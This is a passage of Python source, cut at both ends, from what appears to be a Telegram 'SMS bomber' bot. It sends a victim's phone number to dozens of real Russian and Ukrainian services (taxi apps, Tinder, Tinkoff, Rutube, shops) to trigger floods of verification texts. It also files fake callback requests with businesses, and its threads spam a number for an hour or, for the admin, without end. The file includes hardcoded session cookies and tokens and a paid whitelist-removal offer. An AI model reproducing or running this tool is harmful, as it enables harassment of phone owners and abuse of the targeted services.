                    'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+7%20(' + q + ')' + c + '-' + x + '-' + w,
                    data={'type': 'sendConfirmCode',
                          'phoneNumber': tel},
                    headers={
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Host': 'fundayshop.com',
                        'origin': 'https://fundayshop.com/',
                        'Referer': 'https://fundayshop.com/'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://www.stoloto.ru/send-mobile-app-link',
                                  data={'phone': tel},
                                  headers={
                                      'Accept-Language': 'en-US,en;q=0.5',
                                      'Connection': 'keep-alive',
                                      'Host': 'www.stoloto.ru',
                                      'origin': 'https://www.stoloto.ru',
                                      'Referer': 'https://www.stoloto.ru/mobile-applications?bls=prilogenia_stoloto&int=podval'})
                time.sleep(1)
                sms1vip11 += 1
            except:
                pass
            try:
                r = requests.post('https://intermodann.ru/register/',
                                  data={'action': 'sendCode',
                                        'phone': tel},
                                  headers={
                                      'Accept-Language': 'en-US,en;q=0.5',
                                      'Connection': 'keep-alive',
                                      'Host': 'intermodann.ru',
                                      'origin': 'https://intermodann.ru',
                                      'Referer': 'https://intermodann.ru/register/'})
                sms1vip11 += 1
            except:
                pass
            try:
                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)',
                           'Host': 'ufa.rutaxi.ru',
                           'Connection': 'Keep-Alive',
                           'Accept-Encoding': 'gzip'}
                s = requests.Session()
                r = s.post('https://ufa.rutaxi.ru/a.php?&t=13&version=2&l=' + str(nomer[2:]) + '&enc=utf8&lang=en',
                           headers=headers)
                sms1vip11 += 1
            except:
                pass
            try:
                headers = {'X-Parse-Application-Id': 'App Am9a8b1cy8HNw5PigPBrWZk5WN9pUMWl',
                           'Accept': 'application/json',
                           'Content-Type': 'application/json; charset=UTF-8',
                           'Content-Length': '22',
                           'Host': 'api.rutaxi.ru',
                           'Connection': 'Keep-Alive',
                           'Accept-Encoding': 'gzip',
                           'User-Agent': 'okhttp/3.10.0'}
                s = requests.Session()
                data = '{"phone":"' + str(nomer[2:]) + '"}'
                r = s.post('https://api.rutaxi.ru/api/1.0.0/code/', data=data, headers=headers)
                sms1vip11 += 1
            except:
                pass
            try:
                _phone = nomer[1:]
                _name = 'Дима'
                _text = 'Hi'
                _phone9 = _phone[1:]
                _phoneVodaonline = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[
                                                                                                     7:9] + '-' + _phone[
                                                                                                                  9:11]  # '+7 (915) 666-99-33'
                _phoneBukvaprava = _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                                 9:11]  # '7(915)350-99-99'
                vodaonline = requests.post(
                    'https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php',
                    data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline})
                yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php',
                                          data={'param1': _phone, 'param3': _text, 'param2': _name})
                print(yurmoscow.text)
                bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php',
                                           data={'text_quest_banner': _text, 'name': _name, 'city': 'Москва',
                                                 'tel': _phoneBukvaprava, 'ip': '192.168.1.777',
                                                 'form_page': 'https://bukvaprava.ru/', 'referer': '',
                                                 'action': 'ajax-lead'})
                print(bukvaprava.text)
                blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php',
                                          data={'custom_U22127': _phoneVodaonline})
                print(blablabla.text)
                gosur = requests.post('https://www.gos-ur.ru/zayavka/',
                                      data={'name': _name, 'phone': _phone[4:11], 'question': _text,
                                            'code': _phone[1:4], 'type': 'exit'})
                nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php',
                                          data={'phone': '+' + _phone, 'name': _name, 'sid': '*', 'gclid': '0',
                                                'openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium',
                                                'utm': ''})
                rossovet = requests.post('https://rossovet.ru/qa/msgsave/save',
                                         data={'name': _name, 'comment': _text, 'city': 'Москва',
                                               'phoneprefix': '(' + _phone[1:40] + ')', 'phone': _phone[4:11],
                                               'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7',
                                               'number2': '8', 'checkcode': '15'})
                sms1vip11 += 1
            except:
                pass
            try:
                s = requests.Session()
                r = s.post('https://belkacar.ru/get-confirmation-code', data={'phone': str(nomer[1:])})
                otvet = r.text.split(':')[5]
                if int(otvet[:-1]) >= 59:
                    print("Yes")
                    sms1vip11 += 1
                else:
                    print("No")
            except:
                pass
            try:
                s = requests.Session()
                r = s.get('https://findclone.ru/register', params={'phone': '+' + nomer[1:]})
                otvet = r.text.split(':')[1]
                if otvet[1:-3] == 'Wait for timeout':
                    print('No')
                else:
                    print('Yes')
                    sms1vip11 += 1
            except:
                pass
            try:
                s = requests.Session()
                r = s.post('https://api.iconjob.co/api/web/v1/verification_code', data={'phone': nomer[1:]})
                sms1vip11 += 1
            except:
                pass
            try:
                s = requests.Session()
                r = s.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + nomer})
                sms1vip11 += 1
            except:
                pass
            try:
                s = requests.Session()
                r = s.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + nomer})
                sms1vip11 += 1
            except:
                pass
            time.sleep(1)
            sms1vip11 += 1
            print(sms1vip11)
        handle = open("kolihestvo.txt", "r")
        data = handle.read()
        sms1 = int(data) + int(sms)
        handle.close()
        f = open('kolihestvo.txt', 'w')
        f.write(str(sms1vip11))
        f.close()
        bot.status[str(id1)] = 0
        bot.send_message(id1, f"😯 Спам на номер {str(nomer)} закончен.")
    
def spamvip1(id1, nomer):

            print(id1)
            print(nomer)
            sms = 0
            sms1vip11 = 0
            k = bot.status.get(id1)
            f = open('numWL.txt', 'a')
            f.write(str(nomer) + '\n')
            f.close()
            while sms1vip11 <= 200:

                k = bot.status.get(str(id1))
                print("status: " + str(k))
                try:
                    headers = {'content-type': 'application/x-www-form-urlencoded', 'Content-Length': '469',
                               'Host': 'auth.etaxi.ua', 'Connection': 'Keep-Alive'}
                    data = {
                        'request': '{"id":10,"pm":{"afs":"07","fccs":false,"did":"ffffffff-bb77-407f-ec2c-02ec0033c587","dtp":"a","lcl":"uk","cph":"+' + str(
                            nomer[1:]) + '","psl":"","pvr":"79"},"rq":"signUp"}',
                        'deviceConnectionId': 'fE5oDi-6CKc:APA91bFX-F5ErzwjiUTWLcgCLyMcilIFoPaV64LTVMYDT8tXaz4VW0SDra2geyOJjgRxRpo3zmaxzL_5cGLf5Cf8RiBZ6oKivR8H9usWfxUOS_j-9mTF9HA6fxvg69FLVNKTGDfD1GKi'}
                    s = requests.Session()
                    r = s.post('https://auth.etaxi.ua/clientapp/request/signUp', data=data, headers=headers)
                    otvet = r.text.split('"')[1]
                    if otvet == 'id':
                        print('Yes')
                        sms1vip11 += 1
                    else:
                        print('No')
                    # Сервис 2
                    headers = {'X-Application-Id': '67cd821f-009c-4113-9e99-0ea79c03062c', 'X-Client-Id': '1604',
                               'Accept-Language': 'uk', 'Accept': 'application/json', 'Authorization': 'Bearer',
                               'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '39',
                               'Host': 'balanced.utaxcloud.net', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.12.1'}
                    data = {'phone_number': str(nomer), 'country': 'ua'}
                    s = requests.Session()
                    r = s.post('https://balanced.utaxcloud.net/1604/api/v1/passenger/login', data=data, headers=headers)
                    otvet = r.text.split('"')[7]
                    if otvet == 'Please wait before send code again.':
                        print('No')
                    else:
                        print('Yes')
                        sms1vip11 += 1
                    # Сервис 3
                    headers = {'X-WO-API-APP-ID': 'Android WL', 'Content-Type': 'application/json; charset=UTF-8',
                               'Content-Length': '41', 'Host': 'rainbow.evos.in.ua', 'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.8.0'}
                    data = '{"phone":"' + str(nomer[1:]) + '","taxiColumnId":0}'
                    s = requests.Session()
                    r = s.post(
                        'https://rainbow.evos.in.ua/proxy/1ef77177-3802-4777-9178-b596d85f7e51/api/v2.0/account/getSMSAuthCode',
                        data=data, headers=headers)
                    if r.text == '{}':
                        print('Yes')
                        sms1vip11 += 1
                    else:
                        print('No')
                    # Сервис 4
                    headers = {'Content-Length': '107', 'Content-Type': 'application/json; charset=UTF-8',
                               'Host': 'master.tvoetaxi.kiev.ua:8000', 'User-Agent': 'YP', 'Connection': 'keep-alive'}
                    data = '{"DeviceId":"143730186780248","Phone":"' + str(
                        nomer[3:]) + '","WithoutConfirmation":false,"Command":"ClientRegDevice"}'
                    s = requests.Session()
                    r = s.post('http://master.tvoetaxi.kiev.ua:8000/YTaxiServerClient/Client', data=data,
                               headers=headers)
                    otvet = r.text.split('"')[1]
                    print('Yes')
                    sms1vip11 += 1
                    # Сервис 5
                    headers = {'Host': 'edsttaxi.ddns.net', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1',
                               'Connection': 'keep-alive'}
                    s = requests.Session()
                    r = s.get(
                        'http://edsttaxi.ddns.net/taxi/client_app/get_taxi_light.php?command=register_phone&id_taxi=207&phone=' + str(
                            nomer[1:]), headers=headers)
                    otvet = r.text.split('"')[6]
                    if otvet == ':22,':
                        print('No')
                    else:
                        print('Yes')
                        sms1vip11 += 1
                    headers = {'Accept': 'application/json',
                               'app-session-id': 'd7fddc42-f21f-42c2-8175-5af859d7a753',
                               'app-session-time-elapsed': '407267',
                               'app-version': '1020358',
                               'Content-Type': 'application/json',
                               'install-id': '363bff5f-2289-4e1b-9a96-e9358c8731da',
                               'Origin': 'https://tinder.com',
                               'persistent-device-id': '363bff5f-2289-4e1b-9a96-e9358c8731da',
                               'platform': 'web',
                               'Referer': 'https://tinder.com/',
                               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72',
                               'user-session-id': 'null',
                               'user-session-time-elapsed': 'null',
                               'X-Auth-Token': '',
                               'x-supported-image-formats': 'webp,jpeg'}
                    data = '{"phone_number":"' + str(nomer[1:]) + '"}'
                    s = requests.Session()
                    r = s.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=uk', data=data,
                               headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-Application-Id': '67cd821f-009c-4113-9e99-0ea79c03062c',
                               'X-Client-Id': '1604',
                               'Accept-Language': 'uk',
                               'Accept': 'application/json',
                               'Authorization': 'Bearer',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Content-Length': '39',
                               'Host': 'balanced.utaxcloud.net',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.12.1'}
                    data = {'phone_number': str(nomer),
                            'country': 'ua'}
                    s = requests.Session()
                    r = s.post('https://balanced.utaxcloud.net/1604/api/v1/passenger/login', data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'content-type': 'application/x-www-form-urlencoded',
                               'Content-Length': '469',
                               'Host': 'auth.etaxi.ua',
                               'Connection': 'Keep-Alive', }
                    data = {
                        'request': '{"id":2,"pm":{"afs":"07","fccs":false,"did":"ffffffff-bb77-407f-ec2c-02ec0033c587","dtp":"a","lcl":"uk","cph":"' + str(
                            nomer) + '","psl":"","pvr":"79"},"rq":"signUp"}',
                        'deviceConnectionId': 'fE5oDi-6CKc:APA91bFX-F5ErzwjiUTWLcgCLyMcilIFoPaV64LTVMYDT8tXaz4VW0SDra2geyOJjgRxRpo3zmaxzL_5cGLf5Cf8RiBZ6oKivR8H9usWfxUOS_j-9mTF9HA6fxvg69FLVNKTGDfD1GKi'}
                    s = requests.Session()
                    r = s.post('https://auth.etaxi.ua/clientapp/request/signUp', data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'Accept': 'application/json',
                               'Content-Type': 'application/json; charset=utf-8',
                               'x-ot-app-id': 'cE59691D368c2083K46d',
                               'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)',
                               'Host': 'otaxi.com.ua',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'Content-Length': '216'}
                    data = '{"phone":"' + str(nomer[
                                              1:]) + '","gcm_token":"f0uewn4Fhwg:APA91bF6vmJqN4xMNHGfPzSWYAPkQWe43pqqI6Fb0NjUHNZZx4UIUQ6rYnfKJL3fq4QyBWVVmAizyLuPrzTjrQEHiWhZnE49u2vTAxEPt-ORzDF4OevsEzFNvvJXVNT-SD-7TQ4WtWOJ","os":"aos","locale":"uk"}'
                    s = requests.Session()
                    r = s.post('https://otaxi.com.ua/api/user/getpassword', data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-WO-API-APP-ID': 'Android WL',
                               'Content-Type': 'application/json; charset=UTF-8',
                               'Content-Length': '41',
                               'Host': 'rainbow.evos.in.ua',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.8.0'}
                    data = '{"phone":"' + str(nomer[1:]) + '","taxiColumnId":0}'
                    s = requests.Session()
                    r = s.post(
                        'https://rainbow.evos.in.ua/proxy/c243b99a-ed47-4b1b-ae73-3f23a46406f8/api/v2.0/account/getSMSAuthCode',
                        data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-WO-API-APP-ID': 'Android WL',
                               'Content-Type': 'application/json; charset=UTF-8',
                               'Content-Length': '41',
                               'Host': 'rainbow.evos.in.ua',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.8.0'}
                    data = '{"phone":"' + str(nomer[1:]) + '","taxiColumnId":0}'
                    s = requests.Session()
                    r = s.post(
                        'https://rainbow.evos.in.ua/proxy/1ef77177-3802-4777-9178-b596d85f7e51/api/v2.0/account/getSMSAuthCode',
                        data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'Accept-Encoding': 'identity',
                               'X-Titanium-Id': '67b43f32-507e-4486-9333-fe2b57748cf8',
                               'X-WO-API-APP-ID': 'beeTaxi',
                               'X-Requested-With': 'XMLHttpRequest',
                               'Content-Type': 'application/json;charset=utf-8',
                               'Accept': 'application/json, text/plain, */*',
                               'User-Agent': 'Appcelerator Titanium/6.2.2 (SM-G5332F; Android API Level: 23; uk-UA;)',
                               'Accept-Language': 'uk, uk-UA;q=0.8,en-US;q=0.5,en;q=0.3',
                               'Content-Length': '22',
                               'Host': '80.78.46.230:7200',
                               'Connection': 'keep-alive'}
                    data = '{"phone":"' + str(nomer[3:]) + '"}'
                    s = requests.Session()
                    r = s.post('http://80.78.46.230:7200/api/account/register/sendConfirmCode', data=data,
                               headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-WO-API-APP-ID': 'Android WL',
                               'Content-Type': 'application/json; charset=UTF-8',
                               'Content-Length': '41',
                               'Host': 'rainbow.evos.in.ua',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.8.0'}
                    data = '{"phone":"' + str(nomer[1:]) + '","taxiColumnId":1}'
                    s = requests.Session()
                    r = s.post(
                        'https://rainbow.evos.in.ua/proxy/f7f133e0-5d3a-4baf-a28f-76fcd53a2533/api/v2.0/account/getSMSAuthCode',
                        data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'Accept-Encoding': 'identity',
                               'X-Titanium-Id': '78ec3803-8a09-4870-9aaa-e7fcb988b98d',
                               'X-WO-API-APP-ID': 'ua.com.limetaxi',
                               'X-Requested-With': 'XMLHttpRequest',
                               'Content-Type': 'application/json;charset=utf-8',
                               'Accept': 'application/json, text/plain, */*',
                               'User-Agent': 'Appcelerator Titanium/6.2.2 (SM-G332F; Android API Level: 23; uk-UA;)',
                               'Accept-Language': 'uk, uk-UA;q=0.8,en-US;q=0.5,en;q=0.3',
                               'Content-Length': '22',
                               'Host': '37.57.110.223:7200',
                               'Connection': 'keep-alive'}
                    data = '{"phone":"' + str(nomer[3:]) + '"}'
                    s = requests.Session()
                    r = s.post('http://37.57.110.223:7200/api/account/register/sendConfirmCode', data=data,
                               headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-Application-Id': '67cd821f-009c-4113-9e99-0ea79c03062c',
                               'X-Client-Id': '1604',
                               'Accept-Language': 'uk',
                               'Accept': 'application/json',
                               'Authorization': 'Bearer',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Content-Length': '39',
                               'Host': 'balanced.utaxcloud.net',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.12.1'}
                    data = {'phone_number': str(nomer),
                            'country': 'ua'}
                    s = requests.Session()
                    r = s.post('https://balanced.utaxcloud.net/1604/api/v1/passenger/login', data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'X-WO-API-APP-ID': 'Android WL',
                               'Content-Type': 'application/json; charset=UTF-8',
                               'Content-Length': '41',
                               'Host': 'rainbow.evos.in.ua',
                               'Connection': 'Keep-Alive',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.8.0'}
                    s = requests.Session()
                    data = '{"phone":"' + str(nomer[1:]) + '","taxiColumnId":0}'
                    r = s.post(
                        'https://rainbow.evos.in.ua/proxy/2c5585a4-9ddb-45c4-99d4-66dd1f398aaa/api/v2.0/account/getSMSAuthCode',
                        data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'Content-Type': 'application/x-www-form-urlencoded',
                               'Content-Length': '44',
                               'Host': '5.9.81.105:8001',
                               'Accept-Encoding': 'gzip',
                               'User-Agent': 'okhttp/3.12.1',
                               'Connection': 'keep-alive'}
                    s = requests.Session()
                    data = {'login': str(nomer),
                            'service': '54',
                            'id_firm': '248'}
                    r = s.post('http://5.9.81.105:8001/api/client_mobile/v1/ru/account/getpass/sms', data=data,
                               headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'Accept-Encoding': 'identity',
                               'X-Titanium-Id': '6a960852-02d3-4293-9ddd-d64a46039920e',
                               'X-WO-API-APP-ID': 'ua.com.kengurutaxi',
                               'X-Requested-With': 'XMLHttpRequest',
                               'Content-Type': 'application/json;charset=utf-8',
                               'Accept': 'application/json, text/plain, */*',
                               'User-Agent': 'Appcelerator Titanium/6.2.2 (SM-G5212F; Android API Level: 23; uk-UA;)',
                               'Accept-Language': 'uk, uk-UA;q=0.8,en-US;q=0.5,en;q=0.3',
                               'Content-Length': '22',
                               'Host': '80.78.46.230:7201'}
                    s = requests.Session()
                    data = '{"phone":"' + str(nomer[3:]) + '"}'
                    r = s.post('http://80.78.46.230:7200/api/account/register/sendConfirmCode', data=data,
                               headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'content-length': '28',
                               'accept': 'application/json, text/javascript, */*; q=0.01',
                               'origin': 'https://mistercat.com.ua',
                               'x-requested-with': 'XMLHttpRequest',
                               'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72',
                               'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'referer': 'https://mistercat.com.ua/otsledit-zakaz/profile/login',
                               'accept-encoding': 'gzip, deflate, br',
                               'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                               'cookie': '__cfduid=d3519a0d526cab6fffb58da55e97b3e011564140981',
                               'cookie': 'dca0f91d2ab248fdb3949ea9961b8325=0744u59tqc10v1solcfkf9gsqf',
                               'cookie': '_ga=GA1.3.1346822085.1564140991',
                               'cookie': '_gid=GA1.3.1784136942.1564140991',
                               'cookie': '_fbp=fb.2.1564140991378.1934184625',
                               'cookie': 'VERS=desktop'}
                    s = requests.Session()
                    data = {'phone': str(nomer[1:]),
                            'type': 'send'}
                    r = s.post(
                        'https://mistercat.com.ua/index.php?option=com_ksenmart&view=profile&task=profile.sms_auth&tmpl=ksenmart',
                        data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    headers = {'content-length': '344',
                               'accept': '*/*',
                               'origin': 'https://mafia.ua',
                               'x-csrf-token': 'QmSDq29yFnwPBry3UaxLMUupqM8hBTYO1h1n5PLF',
                               'x-requested-with': 'XMLHttpRequest',
                               'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72',
                               'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'referer': 'https://mafia.ua/618',
                               'accept-encoding': 'gzip, deflate, br',
                               'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                               'cookie': '__cfduid=ddb8308440062d30ac2b17e4f4c3a83991564141696',
                               'cookie': 'city=eyJpdiI6IkE3aW1sQVJhS3l0NzNzKzFzWlRCU3c9PSIsInZhbHVlIjoiRGtHZTB0T0hGZzRVYkNWZ3hrS0VvUT09IiwibWFjIjoiMGU2MjMwOWIxMWVjMGMyZWE2NDYwMjg5NmJlODAxOTk4Yzk0MGZiYzY1MTc4NzFiMWQ3NjUyN2MwNzVjOTU4MSJ9',
                               'cookie': 'id_city=eyJpdiI6InpNTUczWW9xR0tySUZiUllMQTVETkE9PSIsInZhbHVlIjoiRXVMU1lBMkQrQzJaV0FqNzRYMGo3QT09IiwibWFjIjoiNGRhZTEwZWFiYjQ5ODBkZWI0OTE4MjQzY2FhY2ZhNmM1MjhiYjhmYzE0YzM3ZjVlMWVjNjEwNmU4Yjg2NDA1ZCJ9',
                               'cookie': 'abtest_seed=eyJpdiI6ImhyRGdjWE5aclRDSnJqWmhBSndMUEE9PSIsInZhbHVlIjoiVWxFMnFyUTk1Z2xDQ25pc2drdXpxQT09IiwibWFjIjoiNGNjODgwMmZjMDc0Zjg3ZWQxM2UyNWI2ZmRjYTFlNmQzYjg4YjZmMmFlZGI5N2FiMDlkZWVmMzA1ZmQxY2JkNyJ9',
                               'cookie': '_ga=GA1.2.334550677.1564141706',
                               'cookie': '_gid=GA1.2.1959140244.1564141706',
                               'cookie': '_fbp=fb.1.1564141707770.1879229157',
                               'cookie': 'carrotquest_device_guid=904954bd-2d33-43db-8f8a-c3125c3fab4a',
                               'cookie': 'carrotquest_uid=436490373544545926',
                               'cookie': 'carrotquest_auth_token=user.436490373544545926.27191-ba1a82d08fd5924807d2f3625c.59031f61f5ef13062d8b6f363c1e9754b276881c624f1af2',
                               'cookie': 'carrotquest_realtime_services_transport=wss',
                               'cookie': '_dc_gtm_UA-101540476-1=1',
                               'cookie': 'XSRF-TOKEN=eyJpdiI6IjlcL3Q5VEZoTmh2MVR6YTF1K0ROcE93PT0iLCJ2YWx1ZSI6ImwxcWN5dUFHbjNMQWI2UEVEaW1WVFl0M09HcDl5Q0djd2VXT2R4TWdmUjBqS1MxZ21yS0VTSUtCb2ExZnNzN0wwa3NmS3R4YUlqbklVbVp4VjM0cmxBPT0iLCJtYWMiOiIwZmM4ZGZlMmQ0M2YyZjkzZDQ0YjI3ZDQ5NDMxYWQzOGY2MGYyZWNjOTc3YjExNWZhNTVkZDE3NzRiNzVkNzk4In0%3D',
                               'cookie': 'laravel_session=eyJpdiI6ImtISm04RkpkZGp2VzQ0TENFc2NsR2c9PSIsInZhbHVlIjoiVFltcVBWNFFiZ0ZDUEdpUVFDM1FlNncwd2diMVYxOG5PcVM5elA4NUdldVFVRnBORFluNlwvandoQklrMUpcL0dOTEtwOGlxR2gzQ0JzdjlKQ3Z0V1A1Zz09IiwibWFjIjoiYzRiMThkODdlYzQzNGJhZWQwMzI0ZjhiMWJmNDkyYmVhNzY4ZTg2MzhlNDRlM2UyZTg2OTM4MTQ4NzgwYzgyOCJ9',
                               'cookie': 'carrotquest_session=onmwbvna2nzwpoh5ppghjcik20x9zv17',
                               'cookie': 'carrotquest_session_started=1'}
                    s = requests.Session()
                    data = {
                        'recaptcha': '03AOLTBLSX--XDBFSUIVJEAEeqCnzv7KAgsAeBgQdG1h6epOpVMHCvJzn_ZRMs3Gu-ta8brfsa9vg59ikezuFiAwDz5P2hK-NBQNu6xwnsHbx2sTJUMogsUkkeEliDbfSjTsIOH8c0wWLHo0sSHYy1G6cp0b-S_c8CEw-u6Adih1FWhTQTpmAKMiMaEWeTVDX3rrGWrTeN-F8_dN4UFNt1j-Duii9Avnw-2Zoz5SlzraRwU3ZxQGzKpuzO_nhMR29XGtXFO0KqsJI9BUUzOJN2_lf7gvd3BB9OQ1_i_vHm3BA2YKWaMqP_dk48tq1l9qAESFA2J-btOPiV'}
                    r = s.post('https://mafia.ua/api/sessions/' + str(nomer[1:]), data=data, headers=headers)
                    sms1vip11 += 1
                except:
                    pass
                try:
                    s = requests.Session()
                    r = s.post('https://belkacar.ru/get-confirmation-code', data={'phone': str(nomer[1:])})
                    otvet = r.text.split(':')[5]
                    if int(otvet[:-1]) >= 59:
                        print("Yes")
                        sms1vip11 += 1
                    else:
                        print("No")
                except:
                    pass
                try:
                    s = requests.Session()
                    r = s.get('https://findclone.ru/register', params={'phone': '+' + nomer[1:]})
                    otvet = r.text.split(':')[1]
                    if otvet[1:-3] == 'Wait for timeout':
                        print('No')
                        sms1vip11 += 1
                    else:
                        print('Yes')
                except:
                    pass
                try:
                    s = requests.Session()
                    r = s.post('https://api.iconjob.co/api/web/v1/verification_code', data={'phone': nomer[1:]})
                    sms1vip11 += 1
                except:
                    pass
                try:
                    s = requests.Session()
                    r = s.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + nomer})
                    sms1vip11 += 1
                except:
                    pass
                try:
                    s = requests.Session()
                    r = s.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + nomer})
                    sms1vip11 += 1
                except:
                    pass
                sms1vip11 += 1
                time.sleep(1)
                print(sms1vip11)
            bot.status[str(id1)] = 0
            handle = open("kolihestvo.txt", "r")
            data = handle.read()
            sms1 = int(data) + int(sms)
            handle.close()
            f = open('kolihestvo.txt', 'w')
            f.write(str(sms1vip11))
            f.close()
            bot.send_message(id1, '😯 Спам на номер ' + str(nomer) + ' закончен')

            
def start_spam1(chat_id, phone_number, force):
    running_spams_per_chat_id1.append(chat_id)

    if force:
        msg = '😘 Спам запущен на неограниченое время для номера +' + phone_number
    else:
        msg = '😘 Спам запущен на 60 минут на номер +' + phone_number
    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=60)
    with open(num_file, "a+") as ids_file:
        ids_file.seek(0)
        ids_list = [line.split('\n')[0] for line in ids_file]
        ids_file.write(f'{phone_number} {chat_id}\n')
        ids_list.append(phone_number)
        print('+1 номер взорван')
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id1:
            break
        send_for_number2(phone_number)
    bot.send_message(chat_id, '😉 Спам на номер +' + phone_number + ' завершён')
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id1.remove(chat_id)
    except Exception:
        pass


def spam_handler1(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id1:
        bot.send_message(chat_id,
                         '😅 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "✖️ Стоп" и попробуйте ещё раз')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam1, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id,
                             "😭 Данный номер телефона находится в Белом листе. Вы не сможете отправить на него спам. Попробуйте другой номер.\n\n👽 Убрать номер со списка, возможно - через @kakoyta_chel19 за 10руб🐀򓰀")
    else:
        bot.send_message(chat_id, '😔 Сервера сейчас перегружены. Попытайтесь ещё раз через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')


def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = '😘 Спам запущен на неограниченое время для номера +' + phone_number
    else:
        msg = '😘 Спам запущен на 60 минут на номер +' + phone_number
    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=60)
    with open(num_file, "a+") as ids_file:
        ids_file.seek(0)
        ids_list = [line.split('\n')[0] for line in ids_file]
        ids_file.write(f'{phone_number} {chat_id}\n')
        ids_list.append(phone_number)
        print('+1 номер взорван')
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, '😉 Спам на номер +' + phone_number + ' завершён')
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id,
                         '😅 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "✖️ Стоп" и попробуйте ещё раз')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
            threads.append(x)
